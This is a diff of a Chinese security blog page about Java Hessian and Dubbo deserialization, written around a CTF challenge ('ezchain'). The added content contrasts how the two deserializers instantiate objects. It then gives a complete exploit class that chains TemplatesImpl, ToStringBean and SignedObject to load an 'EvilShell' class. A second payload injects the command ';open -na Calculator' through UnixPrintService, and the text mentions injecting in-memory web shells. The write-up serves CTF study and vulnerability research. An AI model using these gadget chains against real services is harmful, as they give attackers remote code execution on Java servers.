@@ -272,7 +272,16 @@ public class unser1 &#123;
 <blockquote>
 <p>Hessian2Input也可以作为入口</p>
 </blockquote>
-<h5 id="Person-一般类-反序列化"><a href="#Person-一般类-反序列化" class="headerlink" title="Person(一般类)反序列化"></a>Person(一般类)反序列化</h5><p>com\alibaba\com\caucho\hessian\io\Hessian2Input.class</p>
+<pre><code>instantiate:306, UnsafeDeserializer (com.caucho.hessian.io)
+readObject:148, UnsafeDeserializer (com.caucho.hessian.io)
+readObjectInstance:2219, Hessian2Input (com.caucho.hessian.io)
+readObject:2140, Hessian2Input (com.caucho.hessian.io)
+readObject:2124, Hessian2Input (com.caucho.hessian.io)
+readMap:114, MapDeserializer (com.caucho.hessian.io)
+readMap:538, SerializerFactory (com.caucho.hessian.io)
+readObject:2110, Hessian2Input (com.caucho.hessian.io)
+main:38, exp2
+</code></pre><h5 id="Person-一般类-反序列化"><a href="#Person-一般类-反序列化" class="headerlink" title="Person(一般类)反序列化"></a>Person(一般类)反序列化</h5><p>com\alibaba\com\caucho\hessian\io\Hessian2Input.class</p>
 <pre><code class="java">    public Object readObject() throws IOException &#123;
         return this.readObject((List)null);
     &#125;
@@ -444,7 +453,232 @@ exp1(ip,port)
 </code></pre>
 <h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p><a target="_blank" rel="noopener" href="https://github.com/lz2y/DubboPOC">https://github.com/lz2y/DubboPOC</a></p>
 <p>参考并进行修改，，，</p>
-<h3 id="虎符ezchain"><a href="#虎符ezchain" class="headerlink" title="虎符ezchain"></a>虎符ezchain</h3>
+<h2 id="dubbo和hession的不同"><a href="#dubbo和hession的不同" class="headerlink" title="dubbo和hession的不同"></a>dubbo和hession的不同</h2><h3 id="类初始化不同"><a href="#类初始化不同" class="headerlink" title="类初始化不同"></a>类初始化不同</h3><p>原生hession使用了Unsafe可以使用初始化任意类</p>
+<p>dubbo通过构造函数初始化，参数默认null，部分构造函数使用到参数可能会报错退出//如SignedObject</p>
+<p>原生readObject和构造函数无关，可以用来绕过一下黑名单</p>
+<h4 id="dubbo-hession"><a href="#dubbo-hession" class="headerlink" title="dubbo hession"></a>dubbo hession</h4><pre><code class="java">        case 111:
+            ref = tag - 96;
+            if (this._classDefs == null) &#123;
+                throw this.error(&quot;No classes defined at reference &#39;&#123;0&#125;&#39;&quot; + tag);
+            &#125;
+
+            def = (Hessian2Input.ObjectDefinition)this._classDefs.get(ref);
+            return this.readObjectInstance((Class)null, def);
+</code></pre>
+<pre><code class="java">    private Object readObjectInstance(Class cl, Hessian2Input.ObjectDefinition def) throws IOException &#123;
+        String type = def.getType();
+        String[] fieldNames = def.getFieldNames();
+        if (cl != null) &#123;//cl=null
+            Deserializer reader = this.findSerializerFactory().getObjectDeserializer(type, cl);
+            return reader.readObject(this, fieldNames);
+        &#125; else &#123;
+            return this.findSerializerFactory().readObject(this, type, fieldNames);//dubbo默认使用this.findSerializerFactory()
+        &#125;
+    &#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20220402010559495.png" alt="image-20220402010559495"></p>
+<p>com\alibaba\com\caucho\hessian\io\SerializerFactory.class</p>
+<pre><code class="java">    public Object readObject(AbstractHessianInput in, String type, String[] fieldNames) throws HessianProtocolException, IOException &#123;
+        Deserializer deserializer = this.getDeserializer(type);
+        if (deserializer != null) &#123;
+            return deserializer.readObject(in, fieldNames);
+        &#125; ...
+</code></pre>
+<p>com\alibaba\com\caucho\hessian\io\JavaDeserializer.class</p>
+<pre><code class="java">    public Object readObject(AbstractHessianInput in, String[] fieldNames) throws IOException &#123;
+        try &#123;
+            Object obj = this.instantiate();
+
+    protected Object instantiate() throws Exception &#123;
+        try &#123;
+            return this._constructor != null ? this._constructor.newInstance(this._constructorArgs) : this._type.newInstance();
+        &#125; catch (Exception var2) &#123;
+            throw new HessianProtocolException(&quot;&#39;&quot; + this._type.getName() + &quot;&#39; could not be instantiated&quot;, var2);
+        &#125;//SignedObject构造函数参数为new Object[3],即三个null时，this.sign(signingKey, signingEngine);报错退出
+    &#125;
+</code></pre>
+<h4 id="原生hession"><a href="#原生hession" class="headerlink" title="原生hession"></a>原生hession</h4><pre><code class="java">        case 111:
+            ref = tag - 96;
+            if (this._classDefs.size() &lt;= ref) &#123;
+                throw this.error(&quot;No classes defined at reference &#39;&quot; + Integer.toHexString(tag) + &quot;&#39;&quot;);
+            &#125;
+
+            def = (Hessian2Input.ObjectDefinition)this._classDefs.get(ref);
+            return this.readObjectInstance((Class)null, def);
+</code></pre>
+<pre><code class="java">    private Object readObjectInstance(Class&lt;?&gt; cl, Hessian2Input.ObjectDefinition def) throws IOException &#123;
+        String type = def.getType();
+        Deserializer reader = def.getReader();
+        Object[] fields = def.getFields();
+        SerializerFactory factory = this.findSerializerFactory();
+        if (cl != reader.getType() &amp;&amp; cl != null) &#123;//cl=null
+            reader = factory.getObjectDeserializer(type, cl);
+            return reader.readObject(this, def.getFieldNames());
+        &#125; else &#123;
+            return reader.readObject(this, fields);//hession使用reader
+        &#125;
+    &#125;
+</code></pre>
+<p>com\caucho\hessian\io\UnsafeDeserializer.class</p>
+<pre><code class="java">    private static Unsafe _unsafe;
+    static &#123;
+        boolean isEnabled = false;
+
+        try &#123;
+            Class&lt;?&gt; unsafe = Class.forName(&quot;sun.misc.Unsafe&quot;);
+            Field theUnsafe = null;
+            Field[] arr$ = unsafe.getDeclaredFields();
+            int len$ = arr$.length;
+
+            for(int i$ = 0; i$ &lt; len$; ++i$) &#123;
+                Field field = arr$[i$];
+                if (field.getName().equals(&quot;theUnsafe&quot;)) &#123;
+                    theUnsafe = field;
+                &#125;
+            &#125;
+
+            if (theUnsafe != null) &#123;
+                theUnsafe.setAccessible(true);
+                _unsafe = (Unsafe)theUnsafe.get((Object)null);
+            &#125;
+
+            isEnabled = _unsafe != null;
+            String unsafeProp = System.getProperty(&quot;com.caucho.hessian.unsafe&quot;);
+            if (&quot;false&quot;.equals(unsafeProp)) &#123;
+                isEnabled = false;
+            &#125;
+        &#125; catch (Throwable var7) &#123;
+            log.log(Level.FINER, var7.toString(), var7);
+        &#125;
+
+        _isEnabled = isEnabled;
+    &#125;
+    public Object readObject(AbstractHessianInput in, Object[] fields) throws IOException &#123;
+        try &#123;
+            Object obj = this.instantiate();
+
+    protected Object instantiate() throws Exception &#123;
+        return _unsafe.allocateInstance(this._type);//只会为我们的类分配内存，不会调用构造函数
+    &#125;
+</code></pre>
+<h2 id="虎符ezchain"><a href="#虎符ezchain" class="headerlink" title="虎符ezchain"></a>虎符ezchain</h2><p><a target="_blank" rel="noopener" href="https://firebasky.github.io/2022/03/22/Codeql-excavate-Java-quadratic-deserialization/">https://firebasky.github.io/2022/03/22/Codeql-excavate-Java-quadratic-deserialization/</a></p>
+<p>不出网</p>
+<p>原生hession</p>
+<h3 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h3><p>遍历到getOutputProperties前报错</p>
+<pre><code>    private transient ThreadLocal _sdom = new ThreadLocal();//transient且readObject内没有赋值
+    public DOM getStylesheetDOM() &#123;
+        return (DOM)_sdom.get();
+    &#125;
+</code></pre><p>改成Templates//只有getOutputProperties</p>
+<pre><code>public interface Templates &#123;
+</code></pre><pre><code class="java">ToStringBean item = new ToStringBean(Templates.class, templates);
+</code></pre>
+<pre><code class="java">package marshalsec;
+
+import com.caucho.hessian.io.Hessian2Input;
+import com.caucho.hessian.io.Hessian2Output;
+import com.rometools.rome.feed.impl.EqualsBean;
+import com.rometools.rome.feed.impl.ToStringBean;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import marshalsec.util.Reflections;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.security.*;
+import java.util.Base64;
+import java.util.HashMap;
+
+import static marshalsec.util.Reflections.setFieldValue;
+
+public class Hession2Double &#123;
+    public static void main(String[] args) throws Exception &#123;
+        byte[] code = ClassPool.getDefault().get(&quot;marshalsec.templates.EvilShell&quot;).toBytecode();
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, &quot;_name&quot;, &quot;abc&quot;);
+        setFieldValue(templates, &quot;_class&quot;, null);
+        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);
+        ToStringBean item = new ToStringBean(Templates.class, templates);
+//        ToStringBean item = new ToStringBean(clazz, obj);
+        ToStringBean tmp = new ToStringBean(String.class, &quot;&quot;);
+        HashMap attachments = new HashMap();
+        // 本地触发calc,需要反射修改
+//        EqualsBean root = new EqualsBean(ToStringBean.class, item);
+        EqualsBean root = new EqualsBean(ToStringBean.class, tmp);
+        attachments.put(root, &quot;pwn&quot;);
+        for (Object key : attachments.keySet()) &#123;
+//            System.out.println(key);
+            Reflections.setFieldValue(key, &quot;obj&quot;, item);
+        &#125;
+        KeyPairGenerator keyPairGenerator;
+        keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);
+        keyPairGenerator.initialize(1024);
+        KeyPair keyPair = keyPairGenerator.genKeyPair();
+        PrivateKey privateKey = keyPair.getPrivate();
+        Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);
+        SignedObject signedObject = new SignedObject(attachments, privateKey,signingEngine);
+//        signedObject.getObject();
+//        HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);
+
+        ToStringBean item1 = new ToStringBean(SignedObject.class, signedObject);//hession不能恢复 _tfactory
+        EqualsBean root1 = new EqualsBean(ToStringBean.class, tmp);
+        HashMap attachments1 = new HashMap();
+        attachments1.put(root1, &quot;pwn&quot;);
+        for (Object key : attachments1.keySet()) &#123;
+//            System.out.println(key);
+            Reflections.setFieldValue(key, &quot;obj&quot;, item1);
+        &#125;
+
+        ByteArrayOutputStream os = new ByteArrayOutputStream();
+        Hessian2Output output = new Hessian2Output(os);
+        output.writeObject(attachments1);
+        output.getBytesOutputStream().flush();
+        output.completeMessage();
+        output.close();
+        System.out.println(new String(Base64.getEncoder().encode(os.toByteArray())));
+
+        byte[] bytes = os.toByteArray();
+        ByteArrayInputStream btin = new ByteArrayInputStream(bytes);
+        Hessian2Input input = new Hessian2Input(btin);
+        input.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>注入handler内存马</p>
+<h3 id="直接命令执行"><a href="#直接命令执行" class="headerlink" title="直接命令执行"></a>直接命令执行</h3><p>hession 可以不⽤实现序列化接口</p>
+<p>可以参考</p>
+<p>marshalsec的实现</p>
+<p>在 sun.print.UnixPrintService 的所有get⽅法都能触发，别看这个是Unix其实linux也</p>
+<p>有，在⾼版本被移除(有兴趣⾃⼰考古)，利⽤⽅式就是简单命令拼接执⾏（缺点就是太能弹</p>
+<p>了，基本上每个get⽅法都能弹）</p>
+<pre><code>Constructor&lt;UnixPrintService&gt; declaredConstructor =
+UnixPrintService.class.getDeclaredConstructor(String.class);
+declaredConstructor.setAccessible(true);
+ObjectBean delegate = new ObjectBean(sun.print.UnixPrintService.class,
+declaredConstructor.newInstance(&quot;;open -na Calculator&quot;));
+ObjectBean root = new ObjectBean(ObjectBean.class, delegate);
+HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);
+//
+ByteArrayOutputStream os = new ByteArrayOutputStream();
+Hessian2Output output = new Hessian2Output(os);
+HessianBase.NoWriteReplaceSerializerFactory sf = new
+HessianBase.NoWriteReplaceSerializerFactory();
+sf.setAllowNonSerializable(true);
+output.setSerializerFactory(sf);
+output.writeObject(map);
+output.getBytesOutputStream().flush();
+output.completeMessage();
+拿flag的话就两种⽅式 JavaAgent 注⼊内存马，或者本来就是ctf
+如何快速拿利⽤链
+在这次⽐赛后我简单学习了下⽤tabby，通过下⾯的neo4j查询语句，之后⼈⼯排查下
+利⽤⼀：
+利⽤⼆：
+output.close();
+System.out.println(new
+String(Base64.getEncoder().encode(os.toByteArray())));
+</code></pre>
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
@@ -472,9 +706,26 @@ exp1(ip,port)
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2022/04/02/HttpHandler%E5%86%85%E5%AD%98%E9%A9%AC/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                </h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
         
           
-            <div class="post-nepre full next">
+            <div class="post-nepre half next">
           
             <a href="/2022/03/24/cms%E6%BC%8F%E6%B4%9E3/" rel="next">
               <div class="background">
@@ -530,7 +781,7 @@ exp1(ip,port)
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <input type="text" class="ins-search-input" placeholder="Type something..."/>
             <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="ins-section-wrapper">
@@ -542,10 +793,10 @@ exp1(ip,port)
 (function (window) {
     var INSIGHT_CONFIG = {
         TRANSLATION: {
-            POSTS: '文章',
-            // PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
+            POSTS: 'Posts',
+            // PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
         },
         ROOT_URL: '/',
         CONTENT_URL: '/content.json',
